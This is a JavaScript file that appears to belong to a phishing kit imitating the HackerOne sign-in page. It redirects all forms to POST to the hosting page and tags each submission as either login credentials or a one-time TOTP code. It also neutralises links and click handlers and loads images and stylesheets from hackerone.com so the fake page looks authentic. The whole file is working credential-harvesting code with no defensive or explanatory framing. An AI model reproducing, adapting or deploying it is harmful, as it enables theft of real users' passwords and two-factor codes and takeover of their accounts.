let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

document.querySelectorAll("link").forEach(li => {
    let prev = li.href
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.href = `https://hackerone.com${prev}`
    }
})

document.querySelectorAll("img").forEach(li => {
    let prev = li.src
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.src = `https://hackerone.com${prev}`
    }
})

document.querySelector(`[type="password"]`).parentElement.parentElement
    .style = `display: inline-block;`
document.querySelector(`[type="password"]`).parentElement.style = `display:flex;justify-content: space-between;`


// sets
let sign_in_email = document.querySelector("#sign_in_email")
let sign_in_password = document.querySelector("#sign_in_password")
// set 
let sign_in_totp_code = document.querySelector("#sign_in_totp_code")

// set 
if (sign_in_email && sign_in_password) {
    addSpikeType("login")
}
else if (sign_in_totp_code) {
    addSpikeType("otp_code")
}


// functions
let user_remember_me = document.querySelector("#user_remember_me")
if (user_remember_me) {
    user_remember_me.required = false
}

let vertical_navigation = document.querySelector("#vertical-navigation")
if (vertical_navigation) {
    if (window.innerWidth < 800) {
        document.querySelector(".js-application-root.full-size").querySelector("div").style = "padding: 0 !important;"
        vertical_navigation.remove()
    }
}